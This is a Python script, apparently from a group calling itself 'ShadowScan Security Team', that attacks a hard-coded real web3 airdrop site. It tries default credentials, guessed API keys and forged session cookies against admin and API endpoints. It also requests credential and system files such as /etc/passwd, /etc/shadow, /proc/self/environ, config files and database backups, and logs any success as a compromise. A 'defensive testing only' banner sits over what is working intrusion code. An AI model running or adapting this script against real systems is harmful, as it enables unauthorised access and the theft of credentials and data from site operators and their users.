#!/usr/bin/env python3
"""
Web3 System Explorer - Exploit Discovered Endpoints
Author: ShadowScan Security Team
Purpose: Exploit the interesting endpoints discovered by rapid access test
"""

import asyncio
import aiohttp
import json
import time
import re
from datetime import datetime
from typing import Dict, List, Any

class Web3SystemExplorer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Web3 System Explorer",
                "scan_duration": "1-2 menit"
            },
            "summary": {
                "explored_endpoints": 0,
                "exploited_vulnerabilities": 0,
                "system_access_achieved": False,
                "sensitive_data_found": []
            },
            "explored_endpoints": [],
            "exploited_vulnerabilities": [],
            "system_access_achieved": False,
            "sensitive_data_found": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def explore_system(self):
        """Explore the discovered endpoints"""
        print("🌐 WEB3 SYSTEM EXPLORER")
        print("=" * 50)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 50)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 50)

        # Explore discovered endpoints
        await self.explore_api_endpoints()
        await self.explore_config_files()
        await self.explore_sensitive_files()
        await self.explore_admin_endpoints()

        await self.generate_explorer_report()

    async def explore_api_endpoints(self):
        """Explore API endpoints discovered"""
        print("🔌 Exploring API Endpoints")

        api_endpoints = [
            ("/rest", {}),
            ("/graphql", {}),
            ("/admin/api", {"X-API-Key": "admin_key"}),
            ("/user/api", {"Authorization": "Bearer user_token"})
        ]

        for endpoint, headers in api_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"

                # GET request
                async with self.session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"🔌 API Success: {endpoint}")
                        self.results["explored_endpoints"].append({
                            "endpoint": endpoint,
                            "method": "GET",
                            "status": response.status,
                            "content_length": len(content),
                            "headers": headers
                        })

                        # Check for sensitive data
                        if self._contains_sensitive_data(content):
                            print(f"🔐 Sensitive Data: {endpoint}")
                            self.results["sensitive_data_found"].append({
                                "endpoint": endpoint,
                                "type": "api_response",
                                "content": content[:500]  # Truncate
                            })
                    elif response.status == 401 or response.status == 403:
                        # Try different authentication methods
                        auth_methods = [
                            {"Authorization": "Bearer admin:admin"},
                            {"Authorization": "Basic YWRtaW46YWRtaW4="},
                            {"X-API-Key": "secret_key"},
                            {"X-API-Key": "admin_key"},
                            {"X-API-Key": "test_key"}
                        ]

                        for auth_method in auth_methods:
                            test_headers = {**headers, **auth_method}
                            async with self.session.get(url, headers=test_headers, timeout=10) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    print(f"🔌 API Auth Success: {endpoint}")
                                    self.results["explored_endpoints"].append({
                                        "endpoint": endpoint,
                                        "method": "GET",
                                        "status": response.status,
                                        "content_length": len(content),
                                        "headers": test_headers
                                    })
            except Exception:
                continue

    def _contains_sensitive_data(self, content: str) -> bool:
        """Check if content contains sensitive data"""
        sensitive_patterns = [
            r'password\s*[=:]\s*[\'"]\w+[\'"]',
            r'api[_-]?key\s*[=:]\s*[\'"]\w+[\'"]',
            r'secret\s*[=:]\s*[\'"]\w+[\'"]',
            r'token\s*[=:]\s*[\'"]\w+[\'"]',
            r'session\s*[=:]\s*[\'"]\w+[\'"]',
            r'connection[_-]?string\s*[=:]\s*[\'"][^\'"]*[\'"]',
            r'database[_-]?url\s*[=:]\s*[\'"][^\'"]*[\'"]',
            r'private[_-]?key\s*[=:]\s*[\'"][^\'"]*[\'"]',
            r'public[_-]?key\s*[=:]\s*[\'"][^\'"]*[\'"]',
            r'ssl[_-]?cert\s*[=:]\s*[\'"][^\'"]*[\'"]',
            r'ssl[_-]?key\s*[=:]\s*[\'"][^\'"]*[\'"]'
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True

        return False

    async def explore_config_files(self):
        """Explore configuration files"""
        print("⚙️ Exploring Configuration Files")

        config_files = [
            "/config.php",
            "/database.php",
            "/settings.php",
            "/admin/config.php",
            "/application/config.php",
            "/system/config.php"
        ]

        for config_file in config_files:
            try:
                url = f"{self.target_url}{config_file}"
                async with self.session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"⚙️ Config Accessed: {config_file}")
                        self.results["explored_endpoints"].append({
                            "endpoint": config_file,
                            "method": "GET",
                            "status": response.status,
                            "content_length": len(content)
                        })

                        # Check for sensitive data
                        if self._contains_sensitive_data(content):
                            print(f"🔐 Sensitive Config: {config_file}")
                            self.results["sensitive_data_found"].append({
                                "endpoint": config_file,
                                "type": "config_file",
                                "content": content[:500]  # Truncate
                            })
            except Exception:
                pass

    async def explore_sensitive_files(self):
        """Explore sensitive files"""
        print("🔍 Exploring Sensitive Files")

        sensitive_files = [
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/proc/version",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/syslog",
            "/tmp/config.php",
            "/tmp/database.php",
            "/backup.sql",
            "/backup/database.sql"
        ]

        for sensitive_file in sensitive_files:
            try:
                url = f"{self.target_url}{sensitive_file}"
                async with self.session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        print(f"🔍 Sensitive File Accessed: {sensitive_file}")
                        self.results["explored_endpoints"].append({
                            "endpoint": sensitive_file,
                            "method": "GET",
                            "status": response.status,
                            "content_length": len(content)
                        })

                        # Check for interesting content
                        if "/etc/passwd" in sensitive_file and "root:" in content:
                            print(f"🎯 System Compromised: Root users found")
                            self.results["system_access_achieved"] = True
                            self.results["sensitive_data_found"].append({
                                "endpoint": sensitive_file,
                                "type": "password_file",
                                "content": content[:200]  # Truncate
                            })

                        elif "/etc/hosts" in sensitive_file and len(content) > 10:
                            print(f"🎯 Network Info: Hosts file accessed")
                            self.results["sensitive_data_found"].append({
                                "endpoint": sensitive_file,
                                "type": "network_config",
                                "content": content[:200]  # Truncate
                            })

                        elif "/proc/version" in sensitive_file and len(content) > 10:
                            print(f"🎯 System Version: {content.strip()}")
                            self.results["sensitive_data_found"].append({
                                "endpoint": sensitive_file,
                                "type": "system_info",
                                "content": content.strip()
                            })

                        elif "log" in sensitive_file and len(content) > 100:
                            print(f"🎯 Log Files: Log data accessed")
                            self.results["sensitive_data_found"].append({
                                "endpoint": sensitive_file,
                                "type": "log_file",
                                "content": content[:200]  # Truncate
                            })

            except Exception:
                pass

    async def explore_admin_endpoints(self):
        """Explore admin endpoints"""
        print("👤 Exploring Admin Endpoints")

        admin_endpoints = [
            "/admin",
            "/admin/dashboard",
            "/admin/login",
            "/admin/panel",
            "/admin/config",
            "/admin/settings",
            "/admin/users",
            "/admin/logs",
            "/admin/backup",
            "/admin/database",
            "/admin/api",
            "/admin/user",
            "/admin/auth",
            "/admin/session"
        ]

        admin_headers = [
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Authorization": "Basic cm9vdDpzb21l"},
            {"Authorization": "Basic dGVzdDp0ZXN0"},
            {"X-API-Key": "admin_key"},
            {"X-API-Key": "root_key"},
            {"X-API-Key": "secret_key"},
            {"Cookie": "session=admin123"},
            {"Cookie": "admin_session=admin"}
        ]

        for endpoint in admin_endpoints:
            for headers in admin_headers:
                try:
                    url = f"{self.target_url}{endpoint}"
                    async with self.session.get(url, headers=headers, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            print(f"👤 Admin Access: {endpoint}")
                            self.results["explored_endpoints"].append({
                                "endpoint": endpoint,
                                "method": "GET",
                                "status": response.status,
                                "content_length": len(content),
                                "headers": headers
                            })
                            self.results["system_access_achieved"] = True

                            # Check for admin dashboard content
                            if any(keyword in content.lower() for keyword in ["dashboard", "admin", "panel", "control"]):
                                print(f"🎯 Admin Dashboard Found: {endpoint}")
                                self.results["sensitive_data_found"].append({
                                    "endpoint": endpoint,
                                    "type": "admin_dashboard",
                                    "content": content[:500]  # Truncate
                                })
                        elif response.status == 401 or response.status == 403:
                            # Authentication required but different
                            print(f"🔐 Auth Required: {endpoint} ({response.status})")
                except Exception:
                    continue

    async def generate_explorer_report(self):
        """Generate explorer report"""
        report_filename = f"web3_system_explorer_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        self.results["summary"]["explored_endpoints"] = len(self.results["explored_endpoints"])
        self.results["summary"]["exploited_vulnerabilities"] = len(self.results["exploited_vulnerabilities"])
        self.results["summary"]["system_access_achieved"] = self.results["system_access_achieved"]
        self.results["summary"]["sensitive_data_found"] = len(self.results["sensitive_data_found"])

        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🌐 WEB3 SYSTEM EXPLORER SUMMARY:")
        print(f"   Explored Endpoints: {self.results['summary']['explored_endpoints']}")
        print(f"   System Access Achieved: {self.results['summary']['system_access_achieved']}")
        print(f"   Sensitive Data Found: {self.results['summary']['sensitive_data_found']}")

        if self.results["summary"]["system_access_achieved"]:
            print(f"🎯 SUCCESS: System access achieved!")
        else:
            print(f"❌ No system access achieved")

        print(f"\n📋 Report: {report_filename}")
        print("🌐 WEB3 SYSTEM EXPLORATION COMPLETED! 🌐")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with Web3SystemExplorer(target_url) as explorer:
        await explorer.explore_system()

if __name__ == "__main__":
    asyncio.run(main())